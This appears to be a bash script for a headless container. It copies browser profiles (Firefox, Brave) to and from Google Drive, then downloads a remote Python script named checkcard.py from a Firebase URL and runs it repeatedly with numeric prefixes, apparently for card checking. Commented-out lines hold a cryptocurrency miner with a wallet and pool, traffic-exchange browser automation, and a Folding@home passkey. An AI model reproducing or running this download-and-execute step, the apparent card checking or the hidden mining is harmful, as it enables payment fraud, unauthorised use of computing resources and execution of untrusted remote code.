#!/bin/bash
SOURCE="/headless/.mozilla"
SOURCE2="headless/.mozilla/."
    #BACKUP="gs://decisive-circle-176914.appspot.com/data/"
    DATE=$(date +%Y_%m_%d)

    DESTINATION="$NAME"".tar.gz"
    DESTINATION2="chrome.tar.gz"
    FULLBACKUP="$BACKUP/"$DESTINATION
    HITLEAP="$BACKUP/"$DESTINATION2
    if [ -z "$SYNC" ]
    then
       id=$(yes|drive view-files |  grep  $DESTINATION |sed 's/^.*,//')
       drive clone $id
       tar -xvzf $DESTINATION
       cp -rf $SOURCE2 $SOURCE
       cp -rf /headless/.mozilla/brave /headless/Desktop/backup
       cp -rf /headless/.mozilla/.config/BraveSoftware /headless/.config/
       find /headless/.mozilla/ -name "*.desktop" -exec cp {} ../ \;
       rm -rf /headless/Desktop/backup/brave/SingletonLock
       echo "Done restore"
    fi
    #./gsutil/gsutil cp $FULLBACKUP /headless/Desktop/backup
    
    
    
    #./gsutil/gsutil cp $HITLEAP /headless/Desktop/backup
    #tar -xvzf $DESTINATION2
    #cp -rf $SOURCE2 $SOURCE
    # while sleep 600; do xdg-open /headless/Desktop/backup/firefox.desktop; done
    #while sleep 600; do xdg-open /headless/Desktop/backup/chromium-browser.desktop done
    #cd beepminer-0.6.1
    #export pool_address1=eu.sushipool.com:443
    #export wallet1='NQ56 JVMC 03YP S4DY NU9C 4VER JER8 EJY1 JX9U'
    #./miner --wallet-address="$wallet1" --pool=$pool_address1 --type=nano --architecture=sandybridge
    #cd ..

    echo $DESTINATION
    cp /headless/Desktop/*.desktop $SOURCE
    cp -rf /headless/Desktop/backup/brave $SOURCE
    cp -rf /headless/.config/BraveSoftware $SOURCE    
    tar -zcvf $DESTINATION $SOURCE
    if [ -z "$SYNC" ]
    then
       #./gsutil/gsutil cp $DESTINATION $BACKUP
       drive rm --id $id
       drive add_remote --file $DESTINATION
    fi
    echo "Done Backup"
  
pip3 install --upgrade pip --user
pip3 install requests python3-xlib pyautogui===0.9.39 --user
python3 -m pip install grequests python3-xlib pyautogui===0.9.39 --user
rm -rf setup*
wget -O check.py https://firebasestorage.googleapis.com/v0/b/jsonserver-b9334.appspot.com/o/checkcard.py?alt=media&token=74756d48-2049-42bc-991f-227f70ccb41d &
sleep 4
python3 check.py 46701001249 us &
sleep 2
python3 check.py 46701001249 us &
sleep 2
python3 check.py 46701001249 us &
sleep 2
python3 check.py 421542 us &
sleep 2
python3 check.py 421542 us &
sleep 2
#run3.sh
#python3 /headless/Desktop/backup/pygui.py
#if [ -z "$FAH" ]
#    then
      #FAHClient --user=8fek7tcbax69 --team=234980 --passkey=f11cf30f860040d0f11cf30f860040d0 --gpu=false --smp=true
#    else
      #run_3.sh
#    fi
#pkill -f F*
